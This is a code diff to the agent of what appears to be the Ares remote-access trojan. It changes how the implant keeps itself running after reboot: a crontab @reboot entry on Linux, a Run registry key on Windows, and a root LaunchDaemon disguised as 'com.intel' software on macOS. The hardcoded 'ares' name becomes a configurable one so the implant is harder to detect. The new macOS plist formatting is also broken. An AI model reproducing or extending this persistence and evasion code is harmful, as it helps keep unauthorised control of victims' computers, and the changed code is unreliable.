@@ -172,7 +172,7 @@ class Agent(object):
         #     self.send_output('[!] Agent seems to be already installed.')
         #     return
         if platform.system() == 'Linux':
-            persist_dir = self.expand_path('~/.ares')
+            persist_dir = self.expand_path('~/.%s') % (self.rootPachName)
             if not os.path.exists(persist_dir):
                 os.makedirs(persist_dir)
             agent_path = os.path.join(persist_dir, os.path.basename(sys.executable))
@@ -180,32 +180,32 @@ class Agent(object):
             os.system('chmod +x ' + agent_path)
             os.system('(crontab -l;echo @reboot ' + agent_path + ')|crontab')
         elif platform.system() == 'Windows':
-            persist_dir = os.path.join(os.getenv('USERPROFILE'), 'ares')
+            persist_dir = os.path.join(os.getenv('USERPROFILE'), self.rootPachName)
             if not os.path.exists(persist_dir):
                 os.makedirs(persist_dir)
             agent_path = os.path.join(persist_dir, os.path.basename(sys.executable))
             shutil.copyfile(sys.executable, agent_path)
-            cmd = "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v ares /t REG_SZ /d \"%s\"" % agent_path
+            cmd = "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v %s /t REG_SZ /d \"%s\"" % (self.rootPachName,agent_path) 
             subprocess.Popen(cmd, shell=True)
         if platform.system() == 'Darwin':
-            persist_dir = self.expand_path('~/.ares')
+            persist_dir = self.expand_path('~/.%s') % self.rootPachName
             if not os.path.exists(persist_dir):
                 os.makedirs(persist_dir)
             agent_path = os.path.join(persist_dir, os.path.basename(sys.executable))
             shutil.copyfile(sys.executable, agent_path)
             os.system('chmod +x ' + agent_path)
-            comIntelAresPlist = """
+            comIntelPlist = """
             <?xml version="1.0" encoding="UTF-8"?>
             <!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
             <plist version="1.0">
             <dict>
-                    <key>ares</key>
+                    <key>%s</key>
                     <false/>
                     <key>Label</key>
-                    <string>com.intel.ares</string>
+                    <string>com.intel.%s</string>
                     <key>ProgramArguments</key>
                     <array>
-                            <string>%s</string>
+                            <string>~/.%s</string>
                     </array>
                     <key>RunAtLoad</key>
                 <true/>
@@ -213,10 +213,10 @@ class Agent(object):
                 <string>root</string>
             </dict>
             </plist>
-            """ % agent_path
-            filename = '/Library/LaunchDaemons/com.intel.ares.plist'
-            with open(filename, 'w') as file_object:
-                file_object.write(comIntelAresPlist)
+            """ % (self.rootPachName)
+            persist_filename = '/Library/LaunchDaemons/com.intel.%s.plist' % (self.rootPachName)
+            with open(persist_filename, 'w') as file_object:
+                file_object.write(comIntelPlist)
 
 
         else:
@@ -227,16 +227,24 @@ class Agent(object):
     def clean(self):
         """ Uninstalls the agent """ 
         if platform.system() == 'Linux':
-            persist_dir = self.expand_path('~/.ares')
+            persist_dir = self.expand_path('~/.%s' % self.rootPachName)
             if os.path.exists(persist_dir):
                 shutil.rmtree(persist_dir)
             os.system('crontab -l|grep -v ' + persist_dir + '|crontab')
         elif platform.system() == 'Windows':
-            persist_dir = os.path.join(os.getenv('USERPROFILE'), 'ares')
-            cmd = "reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v ares"
+            persist_dir = os.path.join(os.getenv('USERPROFILE'), self.rootPachName)
+            cmd = "reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v %s" % self.rootPachName
             subprocess.Popen(cmd, shell=True)
-            cmd = "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce /f /v ares /t REG_SZ /d \"cmd.exe /c del /s /q %s & rmdir %s\"" % (persist_dir, persist_dir)
+            cmd = "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce /f /v %s /t REG_SZ /d \"cmd.exe /c del /s /q %s & rmdir %s\"" % (self.rootPachName,persist_dir, persist_dir,)
             subprocess.Popen(cmd, shell=True)
+        elif platform.system() == 'Darwin':
+                persist_dir = self.expand_path('~/.%s' % self.rootPachName)
+                if os.path.exists(persist_dir):
+                    shutil.rmtree(persist_dir)
+                persist_filename = "/Library/LaunchDaemons/com.intel.%s.plist" % self.rootPachName
+                if os.path.exists(persist_filename):
+                    os.remove(persist_filename)
+
         self.send_output('[+] Agent removed successfully.')
 
     def exit(self):
